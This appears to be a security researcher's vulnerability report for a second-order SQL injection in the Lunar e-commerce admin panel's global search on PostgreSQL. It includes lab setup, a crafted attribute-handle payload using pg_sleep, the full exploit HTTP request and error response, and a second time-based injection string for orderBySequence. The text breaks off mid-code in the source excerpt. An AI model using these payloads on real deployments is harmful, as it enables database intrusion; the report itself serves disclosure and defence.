### Vulnerability details

**Official website / Product:** https://lunarphp.com/

**Repository:** lunarphp/lunar (stars at selection: 3764)

**Vulnerability type:** SQLi

**Vulnerability versions:** lunarphp/lunar **1.4.0** (Filament admin panel / dist `bd7232ddc0a664a65000c9ca4e175716bd1c74f5`); current 1.x monorepo `packages/admin` (audit tip `82f6e4a`); **PostgreSQL** deployments (MySQL does not yield classic SQLi for this payload). Lab: `labs/lunar-r32-a2/starter`, host PHP 8.4.27 `artisan serve` on **127.0.0.1:21202**; Docker `postgres:16` container `lunar-r32a2-postgres` mapped **21210→5432** (also `lunar-r32a2-mysql`/`redis`/`meilisearch`; PoC needs Postgres only).

**Vulnerability URL / Parameter:** `POST /livewire/update` (Filament global search on `/lunar/products`, Livewire component `filament.livewire.global-search`) — second-order via searchable TranslatedText attribute `handle` embedded in JSON-path SQL

**Complex:** yes

### Verification procedure

1. Prepare the lab (original `labs/lunar-r32-a2/` may have been cleaned; reproduce as follows):
   - Install lunarphp/lunar **1.4.0** livewire-starter-kit (or equivalent Filament panel app) with `DB_CONNECTION=pgsql` against Postgres 16 (evidence host port **21210**).
   - Minimal Postgres dependency (PoC needs this only; optionally also redis/mysql/meilisearch):

```yaml
# save as docker-compose.yml ; docker compose up -d
services:
  postgres:
    image: postgres:16
    container_name: lunar-r32a2-postgres
    environment:
      POSTGRES_DB: lunar
      POSTGRES_USER: lunar
      POSTGRES_PASSWORD: secret
    ports:
      - "21210:5432"
```

   - Observed lab topology (`docker compose ps`-style):

```text
NAME                      IMAGE                        SERVICE       PORTS
lunar-r32a2-postgres      postgres:16                  postgres      0.0.0.0:21210->5432/tcp
lunar-r32a2-redis         redis:7                      redis         0.0.0.0:21205->6379/tcp
lunar-r32a2-mysql         mysql:8.0                    mysql         0.0.0.0:21208->3306/tcp
lunar-r32a2-meilisearch   getmeili/meilisearch:v1.11   meilisearch   0.0.0.0:21209->7700/tcp
```

   - App: `php artisan serve --host=127.0.0.1 --port=21202` (PHP 8.4.x).
   - Default admin: `admin@lunarphp.io` / `password`; panel path `/lunar`, login `http://127.0.0.1:21202/lunar/login`.
   - Official starter defaults to MySQL; this sink needs Filament `generate_search_column_expression()` on **pgsql**, which single-quotes JSON path segments — switch to PostgreSQL.
2. Log into the Filament panel as staff; take CSRF from HTML / `XSRF-TOKEN` cookie. Livewire updates need a valid session cookie (the PoC Cookie line below shows only `XSRF-TOKEN`; for repro also send the post-login `demostore_session` or equivalent session name).
3. In Attribute admin, create a searchable product attribute of type `Lunar\FieldTypes\TranslatedText` whose `handle` is a crafted SQL breakout (1.4.0 handle `TextInput` has no charset allowlist), for example:
   `x')::text like '%%') OR EXISTS(SELECT 1 FROM pg_sleep(1)) OR (1=1 and 'junk'||`
4. Open `/lunar/products` and run global search with any term (e.g. `zztest`) via Livewire — the full `POST /livewire/update` below (`updates.search=zztest`).
5. Observe HTTP 500 `Illuminate\Database\QueryException` / `SQLSTATE[42601]` whose SQL contains the injected `EXISTS(SELECT 1 FROM pg_sleep(1))` fragment.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /livewire/update HTTP/1.1
Host: 127.0.0.1:21202
Content-Type: application/json
X-CSRF-TOKEN: 0GZDDkoQMD3eWghUmZEgAC1X2zbnxGe643rJZQVr
X-Livewire: true
Accept: application/json, text/html
Referer: http://127.0.0.1:21202/lunar/products
Origin: http://127.0.0.1:21202
Cookie: XSRF-TOKEN=eyJpdiI6ImlJQ0RvSXlRdVNjNEpUTWZPb0xuSFE9PSIsInZhbHVlIjoiTWs3aVZZaWRWWHE1UXdnNTBiZFhUVTNRSlVFUHdCbG9WVi8rbWlaU0F6bWxnb3IrY01hcXAxSU51dGlLdlMrN0h0bjI1WVptQVpCYytmYzQyRWxJbUkveGVXTnBVVTBFN1VFTENHaGQ4NzF1MnpPQTBPWHlyNDlwRExaM1h5TEgiLCJtYWMiOiJjOWJkZDBjZjgwYWIyNTM1NGJhYmE1N2MyNGIyYmFjZGI4ZmIxMjRlYWJiMGViYTQ3ZDJkZTY2NWZkYmUzMGY2IiwidGFnIjoiIn0%3D
Content-Length: 480
Connection: close

{"_token": "0GZDDkoQMD3eWghUmZEgAC1X2zbnxGe643rJZQVr", "components": [{"snapshot": "{\"data\":{\"search\":\"\"},\"memo\":{\"id\":\"yDagoeeEVCzxIJsPbXkr\",\"name\":\"filament.livewire.global-search\",\"path\":\"lunar\\/products\",\"method\":\"GET\",\"release\":\"a-a-a\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"8a8beebc038b5d522054906ca16c153192dfefba8a90b2a2ac91f1a73af14f21\"}", "updates": {"search": "zztest"}, "calls": []}]}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 500 Internal Server Error
Host: 127.0.0.1:21202
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private
Date: Mon, 02 Nov 2026 01:11:22 GMT
Content-Type: application/json
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImlJQ0RvSXlRdVNjNEpUTWZPb0xuSFE9PSIsInZhbHVlIjoiTWs3aVZZaWRWWHE1UXdnNTBiZFhUVTNRSlVFUHdCbG9WVi8rbWlaU0F6bWxnb3IrY01hcXAxSU51dGlLdlMrN0h0bjI1WVptQVpCYytmYzQyRWxJbUkveGVXTnBVVTBFN1VFTENHaGQ4NzF1MnpPQTBPWHlyNDlwRExaM1h5TEgiLCJtYWMiOiJjOWJkZDBjZjgwYWIyNTM1NGJhYmE1N2MyNGIyYmFjZGI4ZmIxMjRlYWJiMGViYTQ3ZDJkZTY2NWZkYmUzMGY2IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:11:22 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: demostore_session=eyJpdiI6IlNtUXp1V1Vnc3FFa1BXd0RMZ0NDcEE9PSIsInZhbHVlIjoiZDFMcmtpbXQ4K3EreVBHN2lCSE41NVhyN0tLcFFQK2h3ZDRrZVdDaG5VTFVmbGtxUlkvRVFvaVFWb3Zya012QUZ3ekczdXpIWVhkQzh6VENqZGNCcXFjNXhpL2hZR29vMTd0MlppZFFxTTVZUkZMQnU3WUI3SXhSZ2xOYVI4T3MiLCJtYWMiOiIzZTZlNTU2OGE1NGQzYmVhNjliZTA5ZGFhMTkzNjFhZjgzNmEzOWI2NTJhNjQxYzlmYTc0OTA1ZThkYWU2ZDJkIiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:11:22 GMT; Max-Age=7200; path=/; httponly; samesite=lax

{
    "message": "SQLSTATE[42601]: Syntax error: 7 ERROR:  syntax error at or near \"value\"\nLINE 1: ...LECT 1 FROM pg_sleep(1)) OR (1=1 and 'junk'||'->>'value'::te...\n                                                             ^ (Connection: pgsql, SQL: select * from \"lunar_products\" where (exists (select * from \"lunar_product_variants\" where \"lunar_products\".\"id\" = \"lunar_product_variants\".\"product_id\" and lower(\"lunar_product_variants\".\"sku\"::text)::text like %zztest% and \"lunar_product_variants\".\"deleted_at\" is null) or exists (select * from \"lunar_tags\" inner join \"lunar_taggables\" on \"lunar_tags\".\"id\" = \"lunar_taggables\".\"tag_id\" where \"lunar_products\".\"id\" = \"lunar_taggables\".\"taggable_id\" and \"lunar_taggables\".\"taggable_type\" = product and lower(\"lunar_tags\".\"value\"::text)::text like %zztest%) or lower(\"lunar_products\".\"attribute_data\"->'name'->>'value'::text)::text like %zztest% or lower(\"lunar_products\".\"attribute_data\"->'x')::text like '%%') OR EXISTS(SELECT 1 FROM pg_sleep(1)) OR (1=1 and 'junk'||'->>'value'::text)::text like %zztest%) limit 5)",
    "exception": "Illuminate\\Database\\QueryException",
    "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Connection.php",
    "line": 825,
    "trace": [
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Connection.php",
            "line": 779,
            "function": "runQueryCallback",
            "class": "Illuminate\\Database\\Connection",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Connection.php",
            "line": 398,
            "function": "run",
            "class": "Illuminate\\Database\\Connection",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Query/Builder.php",
            "line": 3106,
            "function": "select",
            "class": "Illuminate\\Database\\Connection",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Query/Builder.php",
            "line": 3091,
            "function": "runSelect",
            "class": "Illuminate\\Database\\Query\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Query/Builder.php",
            "line": 3676,
            "function": "{closure:Illuminate\\Database\\Query\\Builder::get():3090}",
            "class": "Illuminate\\Database\\Query\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Query/Builder.php",
            "line": 3090,
            "function": "onceWithColumns",
            "class": "Illuminate\\Database\\Query\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Eloquent/Builder.php",
            "line": 811,
            "function": "get",
            "class": "Illuminate\\Database\\Query\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Database/Eloquent/Builder.php",
            "line": 793,
            "function": "getModels",
            "class": "Illuminate\\Database\\Eloquent\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/filament/filament/src/Resources/Resource.php",
            "line": 458,
            "function": "get",
            "class": "Illuminate\\Database\\Eloquent\\Builder",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/filament/filament/src/GlobalSearch/DefaultGlobalSearchProvider.php",
            "line": 18,
            "function": "getGlobalSearchResults",
            "class": "Filament\\Resources\\Resource",
            "type": "::"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/filament/filament/src/Livewire/GlobalSearch.php",
            "line": 22,
            "function": "getResults",
            "class": "Filament\\GlobalSearch\\DefaultGlobalSearchProvider",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/filament/filament/src/Livewire/GlobalSearch.php",
            "line": 36,
            "function": "getResults",
            "class": "Filament\\Livewire\\GlobalSearch",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php",
            "line": 36,
            "function": "render",
            "class": "Filament\\Livewire\\GlobalSearch",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Container/Util.php",
            "line": 43,
            "function": "{closure:Illuminate\\Container\\BoundMethod::call():35}",
            "class": "Illuminate\\Container\\BoundMethod",
            "type": "::"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php",
            "line": 95,
            "function": "unwrapIfClosure",
            "class": "Illuminate\\Container\\Util",
            "type": "::"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php",
            "line": 35,
            "function": "callBoundMethod",
            "class": "Illuminate\\Container\\BoundMethod",
            "type": "::"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Wrapped.php",
            "line": 23,
            "function": "call",
            "class": "Illuminate\\Container\\BoundMethod",
            "type": "::"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Mechanisms/HandleComponents/HandleComponents.php",
            "line": 320,
            "function": "__call",
            "class": "Livewire\\Wrapped",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Mechanisms/HandleComponents/HandleComponents.php",
            "line": 278,
            "function": "getView",
            "class": "Livewire\\Mechanisms\\HandleComponents\\HandleComponents",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Mechanisms/HandleComponents/HandleComponents.php",
            "line": 127,
            "function": "render",
            "class": "Livewire\\Mechanisms\\HandleComponents\\HandleComponents",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/LivewireManager.php",
            "line": 102,
            "function": "update",
            "class": "Livewire\\Mechanisms\\HandleComponents\\HandleComponents",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Mechanisms/HandleRequests/HandleRequests.php",
            "line": 144,
            "function": "update",
            "class": "Livewire\\LivewireManager",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php",
            "line": 47,
            "function": "handleUpdate",
            "class": "Livewire\\Mechanisms\\HandleRequests\\HandleRequests",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Route.php",
            "line": 266,
            "function": "dispatch",
            "class": "Illuminate\\Routing\\ControllerDispatcher",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Route.php",
            "line": 212,
            "function": "runController",
            "class": "Illuminate\\Routing\\Route",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Router.php",
            "line": 808,
            "function": "run",
            "class": "Illuminate\\Routing\\Route",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 170,
            "function": "{closure:Illuminate\\Routing\\Router::runRouteWithinStack():807}",
            "class": "Illuminate\\Routing\\Router",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Middleware/SubstituteBindings.php",
            "line": 51,
            "function": "{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():168}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Routing\\Middleware\\SubstituteBindings",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/VerifyCsrfToken.php",
            "line": 88,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Foundation\\Http\\Middleware\\VerifyCsrfToken",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/View/Middleware/ShareErrorsFromSession.php",
            "line": 49,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\View\\Middleware\\ShareErrorsFromSession",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php",
            "line": 121,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php",
            "line": 64,
            "function": "handleStatefulRequest",
            "class": "Illuminate\\Session\\Middleware\\StartSession",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Session\\Middleware\\StartSession",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/AddQueuedCookiesToResponse.php",
            "line": 37,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Cookie\\Middleware\\AddQueuedCookiesToResponse",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/EncryptCookies.php",
            "line": 75,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Cookie\\Middleware\\EncryptCookies",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 127,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Router.php",
            "line": 807,
            "function": "then",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Router.php",
            "line": 786,
            "function": "runRouteWithinStack",
            "class": "Illuminate\\Routing\\Router",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Router.php",
            "line": 750,
            "function": "runRoute",
            "class": "Illuminate\\Routing\\Router",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Routing/Router.php",
            "line": 739,
            "function": "dispatchToRoute",
            "class": "Illuminate\\Routing\\Router",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php",
            "line": 201,
            "function": "dispatch",
            "class": "Illuminate\\Routing\\Router",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 170,
            "function": "{closure:Illuminate\\Foundation\\Http\\Kernel::dispatchToRouter():198}",
            "class": "Illuminate\\Foundation\\Http\\Kernel",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/livewire/livewire/src/Features/SupportDisablingBackButtonCache/DisableBackButtonCacheMiddleware.php",
            "line": 19,
            "function": "{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():168}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Livewire\\Features\\SupportDisablingBackButtonCache\\DisableBackButtonCacheMiddleware",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/ConvertEmptyStringsToNull.php",
            "line": 27,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Foundation\\Http\\Middleware\\ConvertEmptyStringsToNull",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/TrimStrings.php",
            "line": 47,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Foundation\\Http\\Middleware\\TrimStrings",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Http/Middleware/ValidatePostSize.php",
            "line": 27,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Http\\Middleware\\ValidatePostSize",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/PreventRequestsDuringMaintenance.php",
            "line": 110,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Foundation\\Http\\Middleware\\PreventRequestsDuringMaintenance",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Http/Middleware/HandleCors.php",
            "line": 49,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Http\\Middleware\\HandleCors",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Http/Middleware/TrustProxies.php",
            "line": 58,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 209,
            "function": "handle",
            "class": "Illuminate\\Http\\Middleware\\TrustProxies",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php",
            "line": 127,
            "function": "{closure:{closure:Illuminate\\Pipeline\\Pipeline::carry():184}:185}",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php",
            "line": 176,
            "function": "then",
            "class": "Illuminate\\Pipeline\\Pipeline",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php",
            "line": 145,
            "function": "sendRequestThroughRouter",
            "class": "Illuminate\\Foundation\\Http\\Kernel",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/public/index.php",
            "line": 51,
            "function": "handle",
            "class": "Illuminate\\Foundation\\Http\\Kernel",
            "type": "->"
        },
        {
            "file": "/home/kali/\u5ba1\u8ba1/github-star3k-webvulns/labs/lunar-r32-a2/starter/vendor/laravel/framework/src/Illuminate/Foundation/resources/server.php",
            "line": 23,
            "function": "require_once"
        }
    ]
}
```

Verification result notes:

Authenticated panel global search returned **HTTP 500** with `SQLSTATE[42601]` and the full SQL string showing attacker-controlled breakout from the JSON-path literal into `OR EXISTS(SELECT 1 FROM pg_sleep(1)) ...`, proving second-order SQL injection on PostgreSQL.

Observed impact summary:

```text
HTTP global-search Livewire update returned 500 QueryException.
Injected SQL fragment present in exception message:
  OR EXISTS(SELECT 1 FROM pg_sleep(1)) OR (1=1 and 'junk'||'->>'value'::text)

Sibling sink (same release): Builder::orderBySequence() on pgsql interpolates IDs into CASE/WHEN
without bindings. Lab time-based proof (tinker, product id=1):
  orderBySequence(["(pg_sleep(3)::text IS NULL)::int + 1"]) → ~3.005s vs baseline ~0.001s
HTTP path for orderBySequence requires Scout keys (not used for counted finding).
```

### Vulnerability analysis

Lunar panel global search builds JSON-path column expressions by concatenating each searchable TranslatedText attribute's `handle`:

`attribute_data->{handle}->value`

Filament's `generate_search_column_expression()` on PostgreSQL wraps each path segment in single quotes. An unsanitized handle containing `'` breaks out of that quoted segment and injects arbitrary SQL into product (and other resource) search queries. The Attribute admin form does not constrain handle to a safe charset. The same concatenation appears in `get_search_builder()` for relation-manager searches when Scout is disabled.

MySQL uses `json_extract` with differently quoted keys and does not yield classic SQLi for this payload. PostgreSQL is officially supported by Lunar (jsonb migrations).

### Trigger / sink source (full path and line numbers):

```php
# File: vendor/lunarphp/lunar/src/Support/Resources/BaseResource.php
# (package lunarphp/lunar 1.4.0; monorepo packages/admin/src/Support/Resources/BaseResource.php)
# Lines: 126-139
protected static function mapSearchableAttributes(array &$map)
{
    $attributes = Attribute::whereAttributeType(
        static::getModel()::morphName()
    )
